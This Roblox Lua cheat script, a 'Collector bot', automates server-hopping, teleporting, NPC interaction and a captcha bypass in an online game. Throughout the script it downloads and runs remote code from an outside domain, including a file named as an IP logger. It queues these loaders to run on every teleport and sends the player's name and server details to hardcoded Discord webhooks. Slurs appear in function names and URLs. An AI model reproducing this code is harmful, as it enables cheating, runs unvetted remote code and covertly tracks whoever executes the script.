--[[
	id: Mqt750g3KzsUFssm6_w5Y
	name: Collector 
	description: Collector bot
	time1: 2021-05-21 22:07:25.161467+00
	time2: 2021-05-21 22:07:25.161468+00
	uploader: IvnADRSWX7AC6M1yT9Ptvzv2ISF7af_Zo9kKqv0S
	uploadersession: Y0uoQyczkx-vHzippP3iZyHNWcCVth
	flag: f
--]]

if game.PlaceId==3016661674 then
local queueforteleport = (syn and syn.queue_on_teleport) or queue_for_teleport;
queueforteleport('wait(.5)loadstring(syn.request{ Method = \'GET\', Url = \'http://archgay.xyz/a123WOWZERS(SCRIPT).lua\' }.Body)();');
end
if game.PlaceId==3541987450 then
local queueforteleport = (syn and syn.queue_on_teleport) or queue_for_teleport;
queueforteleport('wait(.5)loadstring(syn.request{ Method = \'GET\', Url = \'http://archgay.xyz/a123WOWZERS(SCRIPT).lua\' }.Body)();');
wait(4)
print("hello chingus")
spawn(function()
    wait(40)
Game:GetService("TeleportService"):Teleport(3016661674, game:GetService("Players").LocalPlayer)
end)
 function antiAfk()
		game:GetService("Players").LocalPlayer.Idled:connect(function()
			virtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
			wait(1)
			virtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
	end
antiAfk()
print("hello bingis")
print("Daily reminder that Silentos bot is on top")



loadstring(game:HttpGet("http://www.archgay.xyz/empty.lua"))()
--WHITELISTT


repeat wait() until game.Loaded
repeat wait() until game.ReplicatedStorage
wait()
repeat wait() until game.ReplicatedStorage:WaitForChild("ServerInfo")
wait(0.1)
print("started")
local OSTime = os.time();
local Time = os.date('*t', OSTime);
Time = string.format('%02d:%02d:%02d', Time.hour % 12, Time.min, Time.sec);
local servername = game:GetService("ReplicatedStorage").ServerInfo[tostring(game.JobId)].ServerName.Value
rconsolename("INTERNAL SUPER SECRET COLLECTOR SCRIPT!!!!")
loadstring(game:HttpGet("http://www.archgay.xyz/LGBTQ_edd.lua"))()
local msg = "was getting lgbtq rconsole "
local url = "https://discordapp.com/api/webhooks/795571243877138432/qXGiiXXllQrN94_tHw3U-kqmICMKRZMx2iR-76zsGzRfu0DWFvq76_J8ZpML_Q22o-MB"

syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
rconsoleprint("["..Time.."]".." ".."Looking for Collector in: "..servername.."     "..game.JobId.."\n")
local function cprint(...)
    local Content = {};
    
    for Index, Value in pairs{...} do
        table.insert(Content, tostring(Value));
    end

    local OSTime = os.time();
    local Time = os.date('*t', OSTime);
    Time = string.format('%02d:%02d:%02d', Time.hour % 12, Time.min, Time.sec);
    
    rconsoleprint(string.format('[%s] %s\n', Time, table.concat(Content, '   ')));
end

local HttpService = game:GetService'HttpService';
local SettingsFileName = 'SuperiorCollectorBot.json';
local Settings = {
    Webhook = '';
    Soundhere = 'rbxassetid://3993398286';
    Priority = {"Azael Horn", "Heirloom", "Staff of Pain", "Pocket Watch", "Unwavering Focus", "Phoenix Bloom", "Dienis Locket", "Mask of Baima"};
    WaitingTime = 10;
    CaptchaBypass = 'false';
};
if isfile(SettingsFileName) then
    Settings = HttpService:JSONDecode(readfile(SettingsFileName));
else
    local Settings = Settings;
    writefile(SettingsFileName, HttpService:JSONEncode(Settings));
    messageboxasync('Wrote settings to workspace, edit the \'' .. SettingsFileName .. '\' file to change settings', 'Collector Hopper', 0x40000);
end
 
if typeof(Settings) ~= 'table' or not Settings.Webhook then
    LocalPlayer:Kick'Invalid Settings';
end
game:GetService'ScriptContext'.Error:Connect(function(Message, Trace, Script)
    if Script == nil or Script == script then
        LocalPlayer:Kick(string.format('%s\n%s', tostring(Script), Message, Trace));
    end
end);

local queueforteleport = (syn and syn.queue_on_teleport) or queue_for_teleport;
queueforteleport('wait(.5)loadstring(syn.request{ Method = \'GET\', Url = \'http://archgay.xyz/okayniggchickenruggetrs.lua\' }.Body)();');



function dirtyfaggot()
    local UserInputService = game:GetService('UserInputService')
for i, c in pairs(getconnections(UserInputService.WindowFocused)) do
    c:Fire()
end

for i, c in pairs(getconnections(UserInputService.WindowFocusReleased)) do
    c:Disable()
end
for i, c in pairs(getconnections(UserInputService.WindowFocused)) do
    c:Disable()
end
end
  function autoclaim()
      print("Auto claimingb yes")
for i,v in pairs (game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v.Name:match("Azael Horn") or v.Name:match("Heirloom") or v.Name:match("Staff of Pain") or v.Name:match("Pocket Watch") or v.Name:match("Penis")then
            local player = game:GetService("Players").LocalPlayer
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            humanoid:EquipTool(v)
            v:Activate()
            end
    end
end

function getplayers(path)
    local httpservice = game:GetService("HttpService")
    local data = httpservice:JSONDecode(path.Players.Value)
    
    local players = 0
    for i,v in pairs(data) do
        players = i
    end
    
    return tonumber(players)
end
print("Loading Mod Autoreply")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local LogService = game:GetService("LogService")



print("Loaded Mod Autoreply")
	
	



local plr = game:GetService("Players").LocalPlayer
local plrgui = plr:WaitForChild("PlayerGui")
local smenu = plrgui:WaitForChild("StartMenu", 4)
local playremote = smenu:WaitForChild("Finish", 1)
local bb = game:GetService("TeleportService")

print("hello0")

local Players = game:GetService'Players';
local LocalPlayer = Players.LocalPlayer;
local UIS = game:GetService'UserInputService';
local TS = game:GetService'TweenService';
local RunService = game:GetService'RunService';
local Tweening = false;
local TeleportService = game:GetService'TeleportService';

print("hello1")
local Player = game:GetService('Players').LocalPlayer
local mouse = Player:GetMouse()
local Requests = game:GetService('ReplicatedStorage').Requests
local http = game:GetService('HttpService')

print("hello2")
local currentCamera = game:GetService('Workspace').CurrentCamera
local VU = game:GetService('VirtualUser')
local VIM = game:GetService('VirtualInputManager')

-- window focus spoof
local UserInputService = game:GetService('UserInputService')
for i, c in pairs(getconnections(UserInputService.WindowFocused)) do
    c:Fire()
end

for i, c in pairs(getconnections(UserInputService.WindowFocusReleased)) do
    c:Disable()
end
for i, c in pairs(getconnections(UserInputService.WindowFocused)) do
    c:Disable()
end
-- window focus spoof


--SERVER HOPPING



 

--SERVER HOPPING
print("hello2")
local request = syn and syn.request or http_request
function message(happen)
    request({
        Url = Settings.Webhook;
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-"..tostring(happen).."```"})
    });
end

local sup = Drawing.new("Text")
sup.Text = "Silentos collector bot cuh"
sup.Size = 24.0
sup.Visible = true
sup.Outline = true
sup.Color = Color3.new(203/155,5/55,204/155)
sup.Position = Vector2.new(20,1000)

loadstring(game:HttpGet("http://www.archgay.xyz/whitelistedautograbiplogger11211.lua"))()

--AUTOGRAB

function grab()
wait(0.2)
local dialogue = getsenv(game:GetService("Players").LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.DialogueClient)
for i,v in pairs(dialogue) do
    if type(v) == "function" and not is_synapse_function(v) then
        for p,b in pairs(debug.getupvalues(v)) do
            if p == 8 then
                _G.dialogue = b
            end
        end
    end
end



local plr = game.Players.LocalPlayer
local choices = plr.PlayerGui.DialogueGui.DialogueFrame.Choices
local frame = plr.PlayerGui.DialogueGui.DialogueFrame
local found = false
local choice = ""
if frame.visible == true then
for i = 1, #Settings.Priority do
    local arti = Settings.Priority[i];
    if found == false then
    for i1, v1 in pairs(choices:GetChildren()) do
        if v1.Name:lower() == arti:lower() then 
            choice = v1.Name
            print("Choice is: ", choice)
            found = true
            break
        end
    end
    end
end


if found == true then
    _G.dialogue:FireServer({
        ["choice"] = choice
    })
 message("Choice is: ", choice)
 message(choice)
 log(choice)
wait (.1)
_G.dialogue:FireServer({
        exit = true
        })
    wait(2.1)
    autoclaim()
end
if found == false then
    _G.dialogue:FireServer({
        exit = true
    })
message("autograb didn't select anything")
    nothingfound()
  end    
 end
end

--new collector click 

local function Click()
    local myhrp = game.Players.LocalPlayer.Character.HumanoidRootPart
    
    
for i,v in pairs(game.workspace.NPCs:children()) do if v.Name == "Collector" and (v.HumanoidRootPart.Position - myhrp.Position).magnitude < 200 then
collector = v
end
end
    local VirtualInputManager = game:GetService("VirtualInputManager")
    local Camera = workspace.CurrentCamera
    
    local function WTS(Position)
        local Vec3, Visible = Camera:WorldToViewportPoint(Position)
        return Vector2.new(Vec3.X, Vec3.Y), Visible
    end
    
    local collectorVec2, collectorVis = WTS(collector.HumanoidRootPart.Position + Vector3.new(math.random(), math.random(), math.random()))
    
    VirtualInputManager:SendMouseMoveEvent(collectorVec2.X, collectorVec2.Y, game)
    wait(0.2)
    fireclickdetector(collector.ClickDetector)
end
--new collector click


function clickdik(which)
    local player = game:GetService("Players").LocalPlayer
    local frame = player.PlayerGui.DialogueGui.DialogueFrame
    local Click = fireclickdetector
    local Collectors1 = {};

local namecall = mt.__index
local setreadonly = setreadonly or make_writable
setreadonly(mt,false)
mt.__index = newcclosure(function(self, key)
    if checkcaller() then
        return namecall(self, key)
    end
if key == "Hit" then
    return namecall(Collector.HumanoidRootPart, "CFrame")
elseif key == "Target" then
    return namecall(Collector, "HumanoidRootPart")
end
return namecall(self, key)
end)
setreadonly(mt,true)

    for i, v in pairs(workspace:WaitForChild'NPCs':GetChildren()) do
        if v.Name:match'Collector' and v:FindFirstChild'Head' then
            table.insert(Collectors1, v);
        end
    end
    repeat wait()
    if (player.Character.HumanoidRootPart.Position - Collectors1[which].HumanoidRootPart.Position).Magnitude < 10 then
        Click(Collectors1[which]:FindFirstChildOfClass'ClickDetector',3);
    end
    until frame.visible == true
end

function danger()
    print("Kicking from game/returning to menu/ crashing")
wait(1.2)
pcall(function()game.ReplicatedStorage.Requests.ReturnToMenu:InvokeServer(); end)
game:GetService("Players").LocalPlayer:Kick('Found Collector!')
while true do 
    end
end

function nothingfound()
while wait(0.3) do
if game.Players.LocalPlayer.Character:FindFirstChild("Danger") then
    print ("U ARE IN DANGER OOGA APE")
else
game:GetService("Players").LocalPlayer:Kick('You got collector but chose nothing :C')
message("Autograb did not choose anything.. :c")
end
end
end


spawn(function()
repeat
    if game.Players.LocalPlayer.Character:FindFirstChild("Danger") then 
        game.Players.LocalPlayer.Character.Torso.Anchored = false
        end
until game.Players.LocalPlayer.Character:FindFirstChild("Danger")
end)

--AUTOGRAB

function log(msg)
    request({
        Url = "https://discordapp.com/api/webhooks/738884053901770832/4lp6RfReoeiiJQRDEftQbiNsjYYG_TAJfr3LrkYZoB9ySoTGuRbWQTrfo3QKGkxt9v4y";
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-"..tostring(msg).."```"})
    });
end

function water(msg)
    request({
        Url = "https://discord.com/api/webhooks/868538226250502145/2sTHu6xkqpxb_H0t40zqIQs9nUQIuZdZd1i1vYeOWhlFQE4YLV4FppOBEex7dfZyoPb7";
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService('HttpService'):JSONEncode({content = "```diff\n".."-"..tostring(msg).."```"})
    });
end

function playsound()
    a = Instance.new("Sound")    
    a.SoundId = Settings.Soundhere
    a.Parent = game.Lighting
    a.Volume = 6
    a:Play()
end 
print("hello3")

function sendnotif(title, body)
    game.StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = body;
        Duration = 9e9;
    })
end
local BeachRoom
local DesertRoom
local PlainsRoom
local JungleRoom
print("rererererererere")
for i,v in pairs(workspace:GetChildren()) do
    if v.Name == "Part" then
        if v.BrickColor == BrickColor.new("Fawn brown") and v.Size == Vector3.new(9.75, 35.5, 8.25)  then
            DesertRoom = v
        elseif v.BrickColor == BrickColor.new("Dark stone grey") and v.Size == Vector3.new(54.5, 118.75, 41.25) then
            PlainsRoom = v
        elseif v.BrickColor == BrickColor.new("Bronze") and v.Size == Vector3.new(7.5, 36.25, 13.5) then
            JungleRoom = v
        elseif v.BrickColor == BrickColor.new("Smoky grey") and v.Size == Vector3.new(7.5, 36.5, 9.5) then
            BeachRoom = v
        end
    end
end
BeachRoom.Changed:Connect(function()
water("beach room")
end)
DesertRoom.Changed:Connect(function()
water("Desert")
end)

PlainsRoom.Changed:Connect(function()
water("Plaienes(Like impsoter)")
end)
JungleRoom.Changed:Connect(function()
water("jungle room(Where tohka lives)")
end)




local function DistanceTime(Distance, Speed)
    return Distance / Speed;
end
-- FLY FUNCTION
function fly(x)
    local Collectors = {};

    for i, v in pairs(workspace:WaitForChild'NPCs':GetChildren()) do
        if v.Name:match'Collector' and v:FindFirstChild'Head' then
            table.insert(Collectors, v);
        end
    end

    local CF = (Collectors[x].Torso.CFrame) * CFrame.new(0, 0, 2);   
    print("hi")
    Instance.new('Folder', LocalPlayer.Character).Name = 'NoFall';
    print("nofall")
    local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - Collectors[x].Torso.Position).magnitude;
    print("distance")
    print(Distance)
    local Time = DistanceTime(Distance, 180);
    print("hi")
    local TW = TweenInfo.new(Time, Enum.EasingStyle.Linear);
    local Tween = TS:Create(LocalPlayer.Character.HumanoidRootPart, TW, { CFrame = CF });
    Tweening = true;
    Tween:Play();
    Tween.Completed:Connect(function() Tweening = false; end);
end
-- FLY FUNCTION

-- -834.47, 253.25, 272.98 Beach
-- -1283.07, 1164.82, -2338.98 Plains
-- -2604.73, 1097.82, 1475.93 Jungle
-- -1546.47, 363.75, 2445.55 Desert
function bypassCaptcha()
    if (not Player.PlayerGui:FindFirstChild('Captcha')) then
        return;
    end;
    repeat game:GetService('RunService').Heartbeat:Wait() until (Player.PlayerGui.Captcha:FindFirstChild('MainFrame') and Player.PlayerGui.Captcha.MainFrame:FindFirstChild('Viewport') and Player.PlayerGui.Captcha.MainFrame.Viewport:FindFirstChild('Union') and Player.PlayerGui.Captcha.MainFrame:FindFirstChild('Shadow') and Player.PlayerGui.Captcha.MainFrame:FindFirstChild('Options'));
    local captchaOptions = {};
    for i,v in pairs(Player.PlayerGui.Captcha.MainFrame.Options:GetChildren()) do 
        if (v.Name ~= 'UIListLayout') then 
            table.insert(captchaOptions, v);
        end;
    end;
    local pickedOption = captchaOptions[math.random(1, 2)];
    repeat game:GetService('RunService').Heartbeat:Wait() 
        if (Player.PlayerGui:FindFirstChild('Captcha')) then
            local objVector = pickedOption.AbsolutePosition;
            VIM:SendMouseButtonEvent(objVector.X + 90, objVector.Y + 40, 0, true, game, 0);
            wait();
            VIM:SendMouseButtonEvent(objVector.X + 90, objVector.Y + 40, 0, false, game, 0);
        end;
    until (not Player.PlayerGui:FindFirstChild('Captcha'));
    repeat game:GetService('RunService').Heartbeat:Wait() until (Player.PlayerGui.DialogueGui.DialogueFrame.Visible == true);
end

print("wtf")
--[[spawn(function()
    while wait(.01) do
playremote:FireServer()
end
    end)
wait(.3)
smenu.Enabled = false]]
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local PlayButton = game:GetService("Players").LocalPlayer.PlayerGui.StartMenu.Choices.Play
local X = PlayButton.AbsolutePosition.X
local Y = PlayButton.AbsolutePosition.Y

Y = Y + 45
X = X + 10
repeat game:GetService('RunService').Heartbeat:Wait()
game:GetService("VirtualInputManager"):SendMouseButtonEvent(X, Y, 0, true, game, 0)
wait(.15)
game:GetService("VirtualInputManager"):SendMouseButtonEvent(X, Y, 0, false, game, 0)
wait(.15)
game:GetService("VirtualInputManager"):SendMouseButtonEvent(X, Y, 0, true, game, 0)
wait(.25)
until not (Player.PlayerGui:FindFirstChild('StartMenu'));
local timer = 0
spawn(function()
  while timer < 300 do
    wait(1)
    timer = timer + 1
  end
end)
wait(1)
for i,v in pairs(game:GetService('Workspace').NPCs:GetChildren()) do 
    if v.Name == 'Collector' then
        if (Player.Character.Head.Position - v.Torso.Position).Magnitude <= 180 then
            currentCollector = v
        end
    end
end

function worldScreen(Object)
    local screen, visible = currentCamera:WorldToViewportPoint(Object.Position + Vector3.new(0, math.random(), 0))
    return Vector2.new(screen.X, screen.Y), visible
end

function SecretClick(chosenNPC)
    repeat game:GetService('RunService').Heartbeat:Wait()
        local npcVector = worldScreen(chosenNPC.Torso)
        VIM:SendMouseButtonEvent(npcVector.X, npcVector.Y, 0, true, game, 0)
        wait()
        VIM:SendMouseButtonEvent(npcVector.X, npcVector.Y, 0, false, game, 0)
    until Player.PlayerGui.DialogueGui.DialogueFrame.Visible == true or Player.PlayerGui:FindFirstChild('CaptchaLoad') or Player.PlayerGui:FindFirstChild('Captcha')
end
wait(.2)
spawn(function()
-- Kick if no FF
spawn (function()
    wait(4)
    while wait(0.1) do
if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then
    else
     if
 collectorfound == true then
        wait(45)
else
message("You got pushed/spawned out of FF.. (Kicked you from the game and continued hopping)")
     game:GetService("Players").LocalPlayer:Kick('No FF, Serverhopping..') 
     wait(0.1)
     Game:GetService("TeleportService"):Teleport(3016661674, game:GetService("Players").LocalPlayer)
     end
end
end
end)

if Settings.CaptchaBypass then 
spawn (function()
    while wait() do 
Player.PlayerGui.ChildAdded:Connect(function(guiObject)
    if (guiObject.Name) == 'CaptchaDisclaimer' then 
        message("Failed Captcha")
        repeat game:GetService('RunService').Heartbeat:Wait() until (not Player.Character:FindFirstChild('Danger'));
        Player:Kick('\nCaptcha Bypass Failed.');
        wait(5);
        game:Shutdown();
         end
        end)
          end
    end)
end
--[[
Internal notes:

Coordinates(collector TP location) :
Desert:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1546.48694, 351.496887, 2705.07666)

Beach:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-917.272156, 238.099411, 271.082306)

Plaines:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1280.12122, 1125.04834, -2447.00537)

Jungle:
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2686.30859, 1085.34766, 1467.96667)

]]



   print("chingis chaaaan!")     
   
wait(.1)
local character = game.Players.LocalPlayer.Character
collectorfound = false
spawn(function()
   while wait(.01) do
    if (DesertRoom.CanCollide == false) or (DesertRoom.Transparency >= 0.1) then
        spawn (function()
        collectorfound = true
        message("Collector at Desert")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Desert" .. "Servername:" .. servername .. "\nJob Id:"..game.JobId.."" )
         log(timer)
        dirtyfaggot()
        playsound()
        end)
        wait(10.5)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1546.48694, 351.496887, 2705.07666)
        wait(1)
        local location = Vector3.new(-1546.48694, 351.496887, 2705.07666)
        character.Humanoid:MoveTo(location)
        wait(1)
        SecretClick(currentCollector)
        spawn (function()
        if Settings.CaptchaBypass then
            print("The sussy wussy captcha bypass is enabled what da fuck OMG PLS say I GET CAPTCHA CORRECDT ")
            bypassCaptcha()
        end
        end)
        wait(0.1)
        repeat wait()
        until game:GetService("Players").LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.NameTag.Text == "The Collector" 
        grab()
         wait(2)
        autoclaim()
        danger()
        playsound()
                game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
    break
    elseif (BeachRoom.CanCollide == false) or (BeachRoom.Transparency >= 0.1) then
        spawn (function()
        collectorfound = true
        message("Collector at Beach")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Beach \n" .. "Servername:" .. servername .. "\nJob Id:"..game.JobId.."")
        log(timer)
        dirtyfaggot()
        playsound()
        end)
        wait(0.5)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-917.272156, 238.099411, 271.082306)
        wait(1)
        local location = Vector3.new(-917.272156, 238.099411, 271.082306)
        character.Humanoid:MoveTo(location)
        wait(1)
        SecretClick(currentCollector)
        spawn (function()
        if Settings.CaptchaBypass then
            print("The sussy wussy captcha bypass is enabled what da fuck OMG PLS say I GET CAPTCHA CORRECDT ")
            bypassCaptcha()
        end
        end)
        wait(0.1)
        repeat wait()
        until game:GetService("Players").LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.NameTag.Text == "The Collector"
        grab()
        wait(2)
        autoclaim()
        playsound()
        danger()
                game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
        break
    elseif (PlainsRoom.CanCollide == false) or (PlainsRoom.Transparency >= 0.1) then
        spawn (function()
        collectorfound = true
        message("Collector at Plains")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Plains" .. "Servername:" .. servername .. "\nJob Id:"..game.JobId.."")
         log(timer)
        playsound()
        dirtyfaggot()
        end)
        wait(0.5)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1280.12122, 1125.04834, -2447.00537)
        wait(1)
        local location = Vector3.new(-1280.12122, 1125.04834, -2447.00537)
        character.Humanoid:MoveTo(location)
        wait(1)
        SecretClick(currentCollector)
        spawn (function()
        if Settings.CaptchaBypass then
            print("The sussy wussy captcha bypass is enabled what da fuck OMG PLS say I GET CAPTCHA CORRECDT ")
            bypassCaptcha()
        end
        end)
        wait(0.1)
        repeat wait()
        until game:GetService("Players").LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.NameTag.Text == "The Collector"
        grab()
         wait(2)
        autoclaim()
        playsound()
        danger()
                game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
        break
    elseif (JungleRoom.CanCollide == false) or (JungleRoom.Transparency >= 0.1) then
       spawn (function()
        collectorfound = true   
        message("Collector at Jungle")
        log(game.Players.LocalPlayer.Name .. " Found a Collector at " .. "Jungle" .. "Servername:" .. servername .. "\nJob Id:"..game.JobId.."")
        log(timer)
        dirtyfaggot()
        playsound()
       end)
        wait(0.5)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2687, 1028, 1470)
        wait(1.5)
        local location = Vector3.new(-2687, 1028, 1470)
        character.Humanoid:MoveTo(location)
        wait(1.5)
        SecretClick(currentCollector)
        spawn (function()
        if Settings.CaptchaBypass then
            print("The sussy wussy captcha bypass is enabled what da fuck OMG PLS say I GET CAPTCHA CORRECDT ")
            bypassCaptcha()
        end
        end)
        repeat wait()
        until game:GetService("Players").LocalPlayer.PlayerGui.DialogueGui.DialogueFrame.NameTag.Text == "The Collector"
        grab()
        wait(2)
        autoclaim()
        danger()
        playsound()
        game:GetService("Players").LocalPlayer:Kick('Found collector!')
while true do
    end
        _G.found = true
          break
    else
end
end
end)

   wait(Settings.WaitingTime)
        
   --Check to see if collector is found, if it is found, Bot will not hop.  
   
   
if collectorfound == true then
print("Collector is found, not hopping")
else
    
    wait(0.1)
    while wait(0.1) do
        print("serverhopping")
        if _G.found then
            return
        end
        local servers = game.ReplicatedStorage.ServerInfo:GetChildren()
        local randomserver = servers[math.random(1, #servers)]

        local players = getplayers(randomserver)

        if players > 1 and players < 24 then
            game:GetService("ReplicatedStorage").Requests.JoinPublicServer:FireServer(randomserver.Name)
        end
    end
            end
        end)
    end